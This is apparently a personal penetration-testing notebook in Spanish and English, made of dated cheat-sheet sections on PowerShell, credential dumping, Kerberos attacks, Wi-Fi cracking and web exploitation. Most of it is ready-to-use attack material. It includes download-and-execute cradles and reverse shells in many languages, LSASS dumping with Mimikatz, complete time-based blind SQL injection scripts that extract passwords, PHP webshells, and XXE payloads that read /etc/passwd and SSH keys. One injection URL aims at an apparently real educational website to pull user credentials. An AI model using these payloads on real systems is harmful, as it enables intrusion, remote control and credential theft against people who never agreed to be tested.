&#39;Referer&#39;: &#39;[http://10.10.206.146:8085/](http://10.10.206.146:8085/)&#39;,

&#39;Upgrade-Insecure-Requests&#39;: &#39;1&#39;,

&#39;X-Remote-addr&#39;: &#39;127.0.0.1&#39;

}

post\_data = {

&quot;number&quot; : number

}

r = s.post(main\_url, headers=headers\_data,data=post\_data)

print(&quot;intentando con numero %s&quot; % number)

if &quot;rate limit execeeded&quot; in r.text:

        print (f&quot;[-] Header FAILED!!!\n&quot;)

        break

elif &quot;Oh no! How unlucky. Spin the wheel and try again.&quot; in r.text:

pass

else:

print(&quot;el número era %s&quot; % number)

sys.exit(0)



# Powershell cheat sheet

jueves, 7 de mayo de 2020

14:47

Para descargar archivos

powershell.exe -c (new-object System.Net.WebClient).DownloadFile(&#39;[http://10.9.11.225/meter.exe&#39;,&#39;c:\windows\temp\meter.exe&#39;)](http://10.10.14.19/zx.exe%27,%27c:/Users/kostas/Desktop/zx.exe%27))

powershell -c &quot;Invoke-WebRequest -Uri &#39;[http://10.9.11.225/shell.exe](http://10.9.11.225/shell.exe)&#39; -OutFile &#39;C:\Windows\Temp\shell.exe&#39;&quot;

Para ejecutar desde la web

powershell.exe -c (IEX(New-Object Net.WebClient).downloadString(&#39;[http://10.10.14.19:80/39719.ps1&#39;))](http://10.10.14.19/39719.ps1%27)))



Para ejecutar comandos dentro de Powershell

$client = New-Object System.Net.Sockets.TCPClient(&#39;192.168.254.1&#39;,4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2\&gt;&amp;1 | Out-String );$sendback2 = $sendback + &#39;PS &#39; + (pwd).Path + &#39;\&gt; &#39;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()



Get-ChildItem -Path C:\ -Include \*algo.txt\* -Recurse -File ---\&gt; hace las veces de FIND /

Get-Command ---\&gt;para aprender ell listado de cmdlets

Get-NetTCPConnection | where-object -Property State -Match Listen | measure



------------------------------------------

Get-Content (alias: gc) is your usual option for reading a text file. You can then filter further:

gc log.txt | select -first 10 # head
 gc -TotalCount 10 log.txt # also head
 gc log.txt | select -last 10 # tail
 gc -Tail 10 log.txt # also tail (since PSv3), also much faster than above option
 gc log.txt | more # or less if you have it installed
 gc log.txt | %{ $\_ -replace &#39;\d+&#39;, &#39;($0)&#39; } # sed

Gc log.txt| measure ..\&gt; count

_Desde \&lt;_[_https://stackoverflow.com/questions/9682024/how-to-do-what-head-tail-more-less-sed-do-in-powershell_](https://stackoverflow.com/questions/9682024/how-to-do-what-head-tail-more-less-sed-do-in-powershell)_\&gt;_



# PortForwarding - Cómo redireccionar el tráfico de un router (Extranet)

jueves, 7 de mayo de 2020

14:48

Ir a PortRange Fordwarding del configurador del router

Utilizar el puerto de escucha y poner en INTERNAL la IP del segmento interno y habilitar.

Esto hará que cuando el payload busque la IP de internet, el PORTFORWARD lo redirija a la IP Interna



# Procdump + Mimikatz - Cómo Obtener credenciales de un equipo prendido

jueves, 7 de mayo de 2020

14:48

#
# Obtener credenciales de un equipo prendido (con Procdump.exe y mimikatz).

Procdump viene en la suit de sysinternals.

C:\temp\procdump.exe -accepteula -ma lsass.exe lsass.dmp For 32 bits

C:\temp\procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp For 64 bits

El lsass.dmp puede ser analizado en otro computador.

mimikatz.exe privilege::debug sekurlsa::logonPasswords full exit

debe ser ejecutado en una ventana con permisos de administrador



# PWNCAT

viernes, 17 de julio de 2020

02:10

[Introducing Pwncat: Automating Linux Red Team Operations](https://www.youtube.com/watch?v=CISzI9klRkw)



Git clone [https://github.com/CalebStewart/pwncat](https://github.com/CalebStewart/pwncat)

Cd pwncat --\&gt;importante para volver a ejecutar

sudo apt-get install python3-venv

python3 -m venv pwncat-env

source pwncat-env/bin/activate

python3 setup.py install



pwncat --listen -p 4545

CTRL-D para pasar a terminal local

help --\&gt; para ver todas las opciones

Si el prompt está feo se puede usar el comando prompt --basic



privesc -l -\&gt;para revisar posibles escalamientos

privesc -e -u root --\&gt;intentará todas las formas posibles para llegar a root, incluso escalando con otros usuarios.





# REAVER - Cómo crackear wifi WEP

jueves, 7 de mayo de 2020

14:48

Airmon-ng (para ver interfaces disponibles)



Airmon-ng start \&lt;interfazwifi\&gt;



wash -i mon0 (para identificar redes vulnerables)



reaver -i mon0 -b (bssid) -c (canal) -vv



# Pentest monkey reverse shells

miércoles, 17 de febrero de 2021

23:00

Alternativa [https://www.revshells.com/](https://www.revshells.com/)

# **Reverse Shell Cheat Sheet**

If you&#39;re lucky enough to find a command execution vulnerability during a penetration test, pretty soon afterwards you&#39;ll probably want an interactive shell.

If it&#39;s not possible to add a new account / SSH key / .rhosts file and just log in, your next step is likely to be either trowing back a reverse shell or binding a shell to a TCP port.  This page deals with the former.

Your options for creating a reverse shell are limited by the scripting languages installed on the target system – though you could probably upload a binary program too if you&#39;re suitably well prepared.

The examples shown are tailored to Unix-like systems.  Some of the examples below should also work on Windows if you use substitute &quot;/bin/sh -i&quot; with &quot;cmd.exe&quot;.

Each of the methods below is aimed to be a one-liner that you can copy/paste.  As such they&#39;re quite short lines, but not very readable.

**Bash**

Some versions of [bash can send you a reverse shell](http://www.gnucitizen.org/blog/reverse-shell-with-bash/) (this was tested on Ubuntu 10.10):

bash -c &quot;bash -i \&gt;&amp; /dev/tcp/10.0.0.1/8080 0\&gt;&amp;1&quot;

**PERL**

Here&#39;s a shorter, feature-free version of the [perl-reverse-shell](http://pentestmonkey.net/tools/web-shells/perl-reverse-shell):

perl -e &#39;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF\_INET,SOCK\_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr\_in($p,inet\_aton($i)))){open(STDIN,&quot;\&gt;&amp;S&quot;);open(STDOUT,&quot;\&gt;&amp;S&quot;);open(STDERR,&quot;\&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&#39;

There&#39;s also an [alternative PERL revere shell here](http://www.plenz.com/reverseshell).

**Python**

This was tested under Linux / Python 2.7:

python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF\_INET,socket.SOCK\_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;

**PHP**

This code assumes that the TCP connection uses file descriptor 3.  This worked on my test system.  If it doesn&#39;t work, try 4, 5, 6…

php -r &#39;$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i \&lt;&amp;3 \&gt;&amp;3 2\&gt;&amp;3&quot;);&#39;

If you want a .php file to upload, see the more featureful and robust [php-reverse-shell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell).

**Ruby**

ruby -rsocket -e&#39;f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to\_i;exec sprintf(&quot;/bin/sh -i \&lt;&amp;%d \&gt;&amp;%d 2\&gt;&amp;%d&quot;,f,f,f)&#39;

**Netcat**

Netcat is rarely present on production systems and even if it is there are several version of netcat, some of which don&#39;t support the -e option.

nc -e /bin/sh 10.0.0.1 1234

If you have the wrong version of netcat installed, [Jeff Price points out here](http://www.gnucitizen.org/blog/reverse-shell-with-bash/#comment-127498) that you might still be able to get your reverse shell back like this:

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\&gt;&amp;1|nc 10.0.0.1 1234 \&gt;/tmp/f

**Java**

r = Runtime.getRuntime()
 p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5\&lt;\&gt;/dev/tcp/10.0.0.1/2002;cat \&lt;&amp;5 | while read line; do \$line 2\&gt;&amp;5 \&gt;&amp;5; done&quot;] as String[])
 p.waitFor()

[Untested submission from anonymous reader]

**xterm**

One of the simplest forms of reverse shell is an xterm session.  The following command should be run on the server.  It will try to connect back to you (10.0.0.1) on TCP port 6001.

xterm -display 10.0.0.1:1

To catch the incoming xterm, start an X-Server (:1 – which listens on TCP port 6001).  One way to do this is with Xnest (to be run on your system):

Xnest :1

You&#39;ll need to authorise the target to connect to you (command also run on your host):

xhost +targetip

**Further Reading**

Also check out [Bernardo&#39;s Reverse Shell One-Liners](http://bernardodamele.blogspot.com/2011/09/reverse-shells-one-liners.html).  He has some alternative approaches and doesn&#39;t rely on /bin/sh for his Ruby reverse shell.

There&#39;s a [reverse shell written in gawk over here](http://www.gnucitizen.org/blog/reverse-shell-with-bash/#comment-122387).  Gawk is not something that I&#39;ve ever used myself.  However, it seems to get installed by default quite often, so is exactly the sort of language pentesters might want to use for reverse shells.

Tags: [bash](http://pentestmonkey.net/tag/bash), [cheatsheet](http://pentestmonkey.net/tag/cheatsheet), [netcat](http://pentestmonkey.net/tag/netcat), [pentest](http://pentestmonkey.net/tag/pentest), [perl](http://pentestmonkey.net/tag/perl), [php](http://pentestmonkey.net/tag/php), [python](http://pentestmonkey.net/tag/python), [reverseshell](http://pentestmonkey.net/tag/reverseshell), [ruby](http://pentestmonkey.net/tag/ruby), [xterm](http://pentestmonkey.net/tag/xterm)

Posted in [Shells](http://pentestmonkey.net/category/cheat-sheet/shells)

_Desde \&lt;_[_http://webcache.googleusercontent.com/search?q=cache:xkwkzMWCenMJ:pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet+&amp;cd=1&amp;hl=en&amp;ct=clnk&amp;gl=cl_](http://webcache.googleusercontent.com/search?q=cache:xkwkzMWCenMJ:pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet+&amp;cd=1&amp;hl=en&amp;ct=clnk&amp;gl=cl)_\&gt;_



# Responder

lunes, 22 de marzo de 2021

12:27

[https://github.com/lgandx/Responder](https://github.com/lgandx/Responder)

python Responder.py -I eth0 -rdw

Esta herramienta envenenará la red y esperará a que lleguen peticiones a otras carpetas compartidas que no estén disponibles en la red y los capturará.. Trayendo consigo el hash de NetNTLMv2

Esta es posible crackear pero no utilizar para PassTheHash.



![](RackMultipart20210412-4-pcx9xb_html_1d8322a886a1f4fd.png)



# RPCenum

sábado, 3 de abril de 2021

23:55

[https://raw.githubusercontent.com/s4vitar/rpcenum/master/rpcenum](https://raw.githubusercontent.com/s4vitar/rpcenum/master/rpcenum)



# Rubeus

martes, 28 de julio de 2020

12:23

Permite post explotación extraer TGT de un equipo KDC

Rubeus.exe harvest /interval:30 -\&gt;cosecha TGTs cada 30 segundos

Rubeus.exe brute /password:Password1 /noticket --\&gt; este tomará la password y la regará contra todos los usuarios hasta que entregue el .kirbi TGT de ese usuario

![](RackMultipart20210412-4-pcx9xb_html_8722d625920fd96d.png)

Rubeus.rxe kerberoast /format:john /outfile:hash.txt --\&gt; dumpeará los hases de cada usuario kerberoateable.

Sudo hashcat -m 13100 -a 0 hash.txt /rockyou.txt

![](RackMultipart20210412-4-pcx9xb_html_306ae05a09233170.png)

Este hash puede descargarse y romperse con hashcat -m 13100 -a 0 \&lt;hash\&gt; \&lt;wordlist\&gt;

Rubeus.exe asreproast -\&gt; correrá el AS-REP roast buscando usuarios vulnerables y entregará el hash

![](RackMultipart20210412-4-pcx9xb_html_27b80d0e088e6491.png)

Estos hashes pueden romperse pero es necesario agregarles 23$ tras $krb5asrep$ y ejecutarse con el mudulo 18200 de hashcat





# RSMANGLER

jueves, 16 de julio de 2020

19:07

![](RackMultipart20210412-4-pcx9xb_html_6da30bfb72c28dc1.png)

Toma easypass.txt y transforma las palabras en combinaciones más complicadas.



# RUBBER DUCKY CASERO - Como insertar payload en un USB

jueves, 7 de mayo de 2020

14:48

Comprar dispositivo en [Aliexpress](https://www.aliexpress.com/item/EYEWINK-CJMCU-Badusb-USB-Virtual-Keyboard-Badusb-microSD/32816110173.html). CJMCU - virtual Keyboard Badusb USB TTF memory Keyboard ATMEGA32U4 module Price: US $9.50

[Utilizar este manual para configurar y cargar payloads](https://jamescoote.co.uk/diy-rducky-rubberduino/). Ojo que el conversor necesita que los parámetros del PRINT tengan todos paréntesis.. Es decir ahora se usa, print -\&gt; print ()

[Biblioteca de payloads](https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payloads), según Hak5

[Evilduino](https://github.com/rash2kool/EvilDuino/blob/master/EvilDuino.ino).



# RSACTFTOOL

jueves, 7 de mayo de 2020

14:49

Herramienta que sirve para generar llave privada o decifrar aes simples

./RsaCtfTool.py --publickey key.pub --private -\&gt; Genera la Privada

./RsaCtfTool.py --publickey key.pub --uncipherfile flag.enc -\&gt;decifra directamente



RSA - Rivest Shamir Adleman

### The math(s) side

RSA is based on the mathematically difficult problem of working out the factors of a large number. It&#39;s very quick to multiply two prime numbers together, say 17\*23 = 391, but it&#39;s quite difficult to work out what two prime numbers multiply together to make 14351 (113x127 for reference).

### The attacking side

The maths behind RSA seems to come up relatively often in CTFs, normally requiring you to calculate variables or break some encryption based on them. The wikipedia page for RSA seems complicated at first, but will give you almost all of the information you need in order to complete challenges.

There are some excellent tools for defeating RSA challenges in CTFs, and my personal favorite is [https://github.com/Ganapati/RsaCtfTool](https://github.com/Ganapati/RsaCtfTool) which has worked very well for me. I&#39;ve also had some success with [https://github.com/ius/rsatool](https://github.com/ius/rsatool).

The key variables that you need to know about for RSA in CTFs are p, q, m, n, e, d, and c.

&quot;p&quot; and &quot;q&quot; are large prime numbers, &quot;n&quot; is the product of p and q.

The public key is n and d, the private key is n and e.

&quot;m&quot; is used to represent the message (in plaintext) and &quot;c&quot; represents the ciphertext (encrypted text).

### CTFs involving RSA

Crypto CTF challenges often present you with a set of these values, and you need to break the encryption and decrypt a message to retrieve the flag.

There&#39;s a lot more maths to RSA, and it gets quite complicated fairly quickly. If you want to learn the maths behind it, I recommend reading MuirlandOracle&#39;s blog post here: [https://muirlandoracle.co.uk/2020/01/29/rsa-encryption/](https://muirlandoracle.co.uk/2020/01/29/rsa-encryption/).

If you&#39;d like some practice playing with RSA variables, there&#39;s a room available here: [https://tryhackme.com/room/rsa](https://tryhackme.com/room/rsa)



# SET - Cómo crear un backdoor para windows (Powershell)

jueves, 7 de mayo de 2020

14:49

#
# Crear un backdoor con SET para windows (Powershell)

Opcion 1/9/1

Poner IP atacante

Eso creará un txt que se puede pasar a .bat



# SMBclient

jueves, 7 de mayo de 2020

14:49

smbclient -N -L 10.10.10.1

Smbclient –U &quot;&quot; -L //\&lt;IP\&gt;

Smbclient //\&lt;ip\&gt;/dir (para linux anonymous)

smbclient \\\\\&lt;ip\&gt;\\share -u guest -p guest (para windows)

smbclient [\\\\10.10.10.1\\sitio\_compartido](smb://10.10.10.1/sitio_compartido) -U Uservaldido -c &#39;put &quot;SimplereversePHP.php&quot;&#39;

pasa subir una revershell vía puerto 445 (SMB)

smb:\&gt; RECURCE ON

smb:\&gt; PROMPT OFF

smb:\&gt; mget \*

para desgargar todo

[https://docs.google.com/spreadsheets/d/1F9wUdEJv22HdqhSn6hy-QVtS7eumgZWYYrD-OSi6JOc/ht-N](https://docs.google.com/spreadsheets/d/1F9wUdEJv22HdqhSn6hy-QVtS7eumgZWYYrD-OSi6JOc/ht-N) -Lmlview

En caso de tener el error NT\_STATUS\_CONNECTION\_DISCONNECTED

Usar --option=&#39;client min protocol=NT1&#39;

![](RackMultipart20210412-4-pcx9xb_html_870092313404356b.png)



# SQLINJECTION - Cómo insertar código

jueves, 7 de mayo de 2020

14:49

example.php?name=&quot;.sleep(10).&quot;real&quot;.&quot; -\&gt;prueba de concepto

example.php?name=&quot;.system(&quot;ls -lh&quot;).&quot;real&quot;.&quot;

\&lt;?xml version=1.0 encoding=&quot;UTF-8&quot; ?\&gt;



-1&#39; union+select+1+--+

-1&#39; union+distinct+select+1+--+

-1&#39; and union+distinct+select+1+--+

-1&#39; and .0union+distinct+select+1+--+

un bypass no siempre es complicado

_Desde \&lt;_[_https://twitter.com/heavenraiza_](https://twitter.com/heavenraiza)_\&gt;_





# SQLInjetion - Blind

domingo, 19 de julio de 2020

17:56

# Bd.py

#!/usr/bin/python3

# -\*- coding: utf-8 -\*-

import requests, time, sys, signal

from pwn import \* # pip3 install pwn

def def\_handler(sig, frame):

# Definimos que queremos que pase al pulsar Ctrl+C

log.failure(&quot;Saliendo&quot;)

sys.exit(1)

signal.signal(signal.SIGINT, def\_handler)

url = &#39;[http://10.10.170.135:1337/978345210/index.php](http://10.10.170.135:1337/978345210/index.php)&#39;

# Utilizamos Burp Suite para tunelizar las peticiones web

burp = {&#39;http&#39;: &#39;[http://127.0.0.1:8080](http://127.0.0.1:8080/)&#39;}

# Definimos los caracteres que se van a probar

s = r&#39;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ !&quot;#$%&amp;\&#39;()\*+,-./:;\&lt;=\&gt;?@[]^\_&#39;

resultado = &#39;&#39;

# Función para validar cuánto tarda el servidor web en responder

def check(payload):

# Definir los datos que se tramitan vía POST

data\_post = {

&#39;username&#39;: &#39;%s&#39; % payload, # payload se va a pasar como argumento a esta función

&#39;password&#39;: &#39;test&#39;,

&#39;submit&#39;: &#39;+Login+&#39;

}

tiempo\_inicio = time.time() # Obtener el tiempo actual

content = requests.post(url, data=data\_post) # Tramitar la petición POST, con proxies=burp se tuneliza con Burp

tiempo\_fin = time.time()

# Si el tiempo final menos el tiempo actual es mayor de 3 segundos

# Esto quiere decir que la respuesta del lado del servidor ha tardado más de 3 segundos

# Nunca tarda 3 segundos exactos, tarda más

if tiempo\_fin - tiempo\_inicio \&gt; 3:

return 1

p1 = log.progress(&quot;Base de datos&quot;)

p2 = log.progress(&quot;Payload&quot;)

# 10 define el número total de caracteres del nombre de la BBDD

for i in range(1, 10):

# Recorrer cada carácter a probar de la variable c

for c in s:

payload = &quot;&#39; or if(substr(database(),%d,1)=binary(0x%s),sleep(3),1)-- -&quot; % (i,c.encode(&#39;utf-8&#39;).hex())

p2.status(&quot;%s&quot; % payload) # Muestra todas las peticiones que se van tramitando a tiempo real

if check(payload):

# La variable resultado se va a ir ampliando con el nombre de la BBDD actual

resultado += c

p1.status(&quot;%s&quot; % resultado)

break

log.info(&quot;Base de datos: %s&quot; % resultado) # Mostrar el nombre final de la BBDD actual



# Tablas.py

#!/usr/bin/python3

# -\*- coding: utf-8 -\*-

import requests, time, sys, signal

from pwn import \*

def def\_handler(sig, frame):

log.failure(&quot;Saliendo&quot;)

sys.exit(1)

signal.signal(signal.SIGINT, def\_handler)

url = &#39;[http://10.10.170.135:1337/978345210/index.php](http://10.10.170.135:1337/978345210/index.php)&#39;

burp = {&#39;http&#39;: &#39;[http://127.0.0.1:8080](http://127.0.0.1:8080/)&#39;}

s = r&#39;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ !&quot;#$%&amp;\&#39;()\*+,-./:;\&lt;=\&gt;?@[]^\_&#39;

resultado = &#39;&#39;

def check(payload):

data\_post = {

&#39;username&#39;: &#39;%s&#39; % payload,

&#39;password&#39;: &#39;test&#39;,

&#39;submit&#39;: &#39;+Login+&#39;

}

tiempo\_inicio = time.time()

content = requests.post(url, data=data\_post)

tiempo\_fin = time.time()

if tiempo\_fin - tiempo\_inicio \&gt; 3:

return 1

p2 = log.progress(&quot;Payload&quot;)

# Define la base de datos previamente encontrada

bbdd = &quot;Webapp&quot;

for j in range(0, 3): # 3 define el número de tablas

p1 = log.progress(&quot;Tabla [%d]&quot; % j)

for i in range(1, 10): # 10 define el número total de caracteres del nombre la tabla

for c in s:

# Con LIMIT listamos una única tabla

# El payload se traduce de la siguiente forma:

# El primer bucle se encarga de tomar un número de tabla concreto

# Para la primera tabla que encuentre va a probar la primera posición y va a ir fuzzeando cada uno de los caracteres

# En el momento que coincida va a haber un break y va a saltar a la siguiente posición

# Va a continuar enumerando hasta alcanzar los 10 caracteres establecidos en el segundo bucle

# Una vez termine se va a ir al LIMIT 1,1 y va a continuar enumerando todas las tablas

payload = &quot;&#39; or if(substr((select table\_name from information\_schema.tables where table\_schema=&#39;%s&#39; limit %d,1),%d,1)=binary(0x%s),sleep(3),1)-- -&quot; % (bbdd,j,i,c.encode(&#39;utf-8&#39;).hex())

p2.status(&quot;%s&quot; % payload)

if check(payload):

resultado += c

p1.status(&quot;%s&quot; % resultado)

break

# Histórico con las tablas encontradas

p1.success(&quot;%s&quot; % resultado)

# Se encarga de vaciar el resultado

resultado = &#39;&#39;



# Columnas.py

#!/usr/bin/python3

# -\*- coding: utf-8 -\*-

import requests, time, sys, signal

from pwn import \*

def def\_handler(sig, frame):

log.failure(&quot;Saliendo&quot;)

sys.exit(1)

signal.signal(signal.SIGINT, def\_handler)

url = &#39;[http://10.10.170.135:1337/978345210/index.php](http://10.10.170.135:1337/978345210/index.php)&#39;

burp = {&#39;http&#39;: &#39;[http://127.0.0.1:8080](http://127.0.0.1:8080/)&#39;}

s = r&#39;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ !&quot;#$%&amp;\&#39;()\*+,-./:;\&lt;=\&gt;?@[]^\_&#39;

resultado = &#39;&#39;

def check(payload):

data\_post = {

&#39;username&#39;: &#39;%s&#39; % payload,

&#39;password&#39;: &#39;test&#39;,

&#39;submit&#39;: &#39;+Login+&#39;

}

tiempo\_inicio = time.time()

content = requests.post(url, data=data\_post)

tiempo\_fin = time.time()

if tiempo\_fin - tiempo\_inicio \&gt; 3:

return 1

p2 = log.progress(&quot;Payload&quot;)

# Define la base de datos previamente encontrada

bbdd = &quot;Webapp&quot;

# Define la tabla previamente encontrada

tabla = &quot;Users&quot;

for j in range(0, 3): # 3 define el número de columnas

p1 = log.progress(&quot;Columna [%d]&quot; % j)

for i in range(1, 10): # 10 define el número total de caracteres del nombre la columna

for c in s:

payload = &quot;&#39; or if(substr((select column\_name from information\_schema.columns where table\_name=&#39;%s&#39; and table\_schema=&#39;%s&#39; limit %d,1),%d,1)=binary(0x%s),sleep(3),1)-- -&quot; % (tabla,bbdd,j,i,c.encode(&#39;utf-8&#39;).hex())

p2.status(&quot;%s&quot; % payload)

if check(payload):

resultado += c

p1.status(&quot;%s&quot; % resultado)

break

# Histórico con las columnas encontradas

p1.success(&quot;%s&quot; % resultado)

# Se encarga de vaciar el resultado

resultado = &#39;&#39;



# Registros.py

#!/usr/bin/python3

# -\*- coding: utf-8 -\*-

import requests, time, sys, signal

from pwn import \*

def def\_handler(sig, frame):

log.failure(&quot;Saliendo&quot;)

sys.exit(1)

signal.signal(signal.SIGINT, def\_handler)

url = &#39;[http://10.10.170.135:1337/978345210/index.php](http://10.10.170.135:1337/978345210/index.php)&#39;

burp = {&#39;http&#39;: &#39;[http://127.0.0.1:8080](http://127.0.0.1:8080/)&#39;}

s = r&#39;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ !&quot;#$%&amp;\&#39;()\*+,-./:;\&lt;=\&gt;?@[]^\_&#39;

resultado = &#39;&#39;

def check(payload):

data\_post = {

&#39;username&#39;: &#39;%s&#39; % payload,

&#39;password&#39;: &#39;test&#39;,

&#39;submit&#39;: &#39;+Login+&#39;

}

tiempo\_inicio = time.time()

content = requests.post(url, data=data\_post)

tiempo\_fin = time.time()

if tiempo\_fin - tiempo\_inicio \&gt; 3:

return 1

p2 = log.progress(&quot;Payload&quot;)

# Define la base de datos previamente encontrada

bbdd = &quot;Webapp&quot;

# Define la tabla previamente encontrada

tabla = &quot;Users&quot;

# Define la columna previamente encontrada

columna = &quot;username&quot;

for j in range(0, 10): # 10 define el número de registros

p1 = log.progress(&quot;Registro [%d]&quot; % j)

for i in range(1, 10): # 10 define el número total de caracteres del nombre del registro

for c in s:

payload = &quot;&#39; or if(substr((select %s from %s.%s limit %d,1),%d,1)=binary(0x%s),sleep(3),1)-- -&quot; % (columna,bbdd,tabla,j,i,c.encode(&#39;utf-8&#39;).hex())

p2.status(&quot;%s&quot; % payload)

if check(payload):

resultado += c

p1.status(&quot;%s&quot; % resultado)

break

# Histórico con los registros encontrados

p1.success(&quot;%s&quot; % resultado)

# Se encarga de vaciar el resultado

resultado = &#39;&#39;

# Claves.py

#!/usr/bin/python3

# -\*- coding: utf-8 -\*-

import requests, time, sys, signal

from pwn import \*

def def\_handler(sig, frame):

log.failure(&quot;Saliendo&quot;)

sys.exit(1)

signal.signal(signal.SIGINT, def\_handler)

url = &#39;[http://10.10.170.135:1337/978345210/index.php](http://10.10.170.135:1337/978345210/index.php)&#39;

burp = {&#39;http&#39;: &#39;[http://127.0.0.1:8080](http://127.0.0.1:8080/)&#39;}

s = r&#39;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ !&quot;#$%&amp;\&#39;()\*+,-./:;\&lt;=\&gt;?@[]^\_&#39;

resultado = &#39;&#39;

def check(payload):

data\_post = {

&#39;username&#39;: &#39;%s&#39; % payload,

&#39;password&#39;: &#39;test&#39;,

&#39;submit&#39;: &#39;+Login+&#39;

}

tiempo\_inicio = time.time()

content = requests.post(url, data=data\_post)

tiempo\_fin = time.time()

if tiempo\_fin - tiempo\_inicio \&gt; 3:

return 1

# Define la base de datos encontrada previamente

bbdd = &quot;Webapp&quot;

# Define la tabla encontrada previamente

tabla = &quot;Users&quot;

# Define el usuario encontrado

usuario = &quot;gimli&quot;

p1 = log.progress(&quot;Contraseña&quot;)

p2 = log.progress(&quot;Payload&quot;)

for i in range(1, 40): # Establecemos 40 caracteres para la contraseña por si fuese larga o un hash

for c in s:

payload = &quot;&#39; or if(substr((select password from %s where username=&#39;%s&#39;),%d,1)=binary(0x%s),sleep(3),1)-- -&quot; % (tabla,usuario,i,c.encode(&#39;utf-8&#39;).hex())

p2.status(&quot;%s&quot; % payload)

if check(payload):

resultado += c

p1.status(&quot;%s&quot; % resultado)

break

# Histórico con los usuarios encontrados

p1.success(&quot;%s&quot; % resultado)



# SSHUTTLE - proxy

sábado, 20 de marzo de 2021

17:54

Apt install sshuttle

sshuttle -r root@10.200.82.200 --ssh-cmd &quot;ssh -i id\_rsa&quot; 10.200.82.0/24 -x 10.200.82.200 &amp;



# PHP Remote File Inclusion command shell using data://

jueves, 7 de mayo de 2020

14:50

\&lt;form action=&quot;\&lt;?=$\_SERVER[&#39;REQUEST\_URI&#39;]?\&gt;&quot; method=&quot;POST&quot;\&gt;\&lt;input type=&quot;text&quot; name=&quot;x&quot; value=&quot;\&lt;?=htmlentities($\_POST[&#39;x&#39;])?\&gt;&quot;\&gt;\&lt;input type=&quot;submit&quot; value=&quot;cmd&quot;\&gt;\&lt;/form\&gt;\&lt;pre\&gt;\&lt;? echo `{$_POST[&#39;x&#39;]}`; ?\&gt;\&lt;/pre\&gt;\&lt;? die(); ?\&gt;

Inyección de shell via RFI

\&lt;!DOCTYPE xxx [\&lt;!ENTITY xxe SYSTEM &quot;[http://localhost/shell.php](http://localhost/shell.php)&quot; \&gt;]\&gt;

\&lt;foo\&gt;&amp;xxe;\&lt;/foo\&gt;

Tambien puede usarse &quot;[http://remotehost/index.php?page=](http://remotehost/index.php?page=)[http://localhost/shell.php](http://localhost/shell.php)&quot;



For basic features, I recommend oneliners like :

\&lt;?php echo passthru($\_GET[&#39;cmd&#39;]); ?\&gt;

\&lt;?php echo exec($\_POST[&#39;cmd&#39;]); ?\&gt;

\&lt;?php system($\_GET[&#39;cmd&#39;]); ?\&gt;

\&lt;?php passthru($\_REQUEST[&#39;cmd&#39;]); ?\&gt;

_Desde \&lt;_[_https://github.com/JohnTroony/php-webshells_](https://github.com/JohnTroony/php-webshells)_\&gt;_





# Inyección de XML

jueves, 7 de mayo de 2020

14:50

\&lt;!DOCTYPE xxx [\&lt;!ENTITY passfile SYSTEM &quot;[file:///etc/passwd&quot;\&gt;]\&gt;\&lt;test\&gt;hacker%26passfile;\&lt;/test](smb://etc/paswd%5C)\&gt;

(by using http:// instead of [file://](/))

[file:///home/\&lt;user\&gt;/.ssh/id\_rsa](smb://home/%3Cuser%3E/.ssh/id_rsa) -\&gt;para extraer la llave privada del usuario y luego usarla para conectarse via ssh

chmod 777 id\_rsa



ssh -i id\_rsa \&lt;user\&gt;@\&lt;host\&gt;

si dice que tiene demasiados permisos.. probar con chmod 600



# Inyección SQL manualmente

jueves, 7 de mayo de 2020

14:52

htxxtp://www.TARGET.com/TARGET.php?id=1

htxxtp://www.TARGET.com/TARGET.php?id=-1+union+select+1,table\_name,3,4,5,6,7+from+information\_schema.tables--

htxxtp://www.TARGET.com/TARGET.php?id=-1+union+select+1,table\_name,3,4,5,6,7+from+information\_schema.tables+limit+2,1--

htxxtp://www.TARGET.com/TARGET.php?id=-1+union+select+1,table\_name,3,4,5,6,7+from+information\_schema.tables+limit+76,1--

htxxtp://www.TARGET.com/TARGET.php?id=-1+union+select+1,group\_concat(column\_name),3,4,5,6,7+from+information\_schema.columns+where+table\_name=char(NUMERO DEL ASCII)--

[http://www.avp.edu.ar/verperiodico.php?id=-27+union+select+1,concat(user,0x3a,password),3,4,5,6,7+from+usuarios](http://www.avp.edu.ar/verperiodico.php?id=-27+union+select+1,concat(user,0x3a,password),3,4,5,6,7+from+usuarios)--

[http://ip/admin.php?id=1+union+select+(select](http://ip/admin.php?id=1+union+select+(select) table\_name from information\_schema.tables where table\_schema=&quot;\&lt;database\&gt;&quot; limit 0,1),2,3,4 limit 1,1--

?id=1 union select 1,group\_concat(\&lt;column\&gt;, &quot;\n&quot;),3,4 from \&lt;database\&gt;.\&lt;table\&gt;-- -

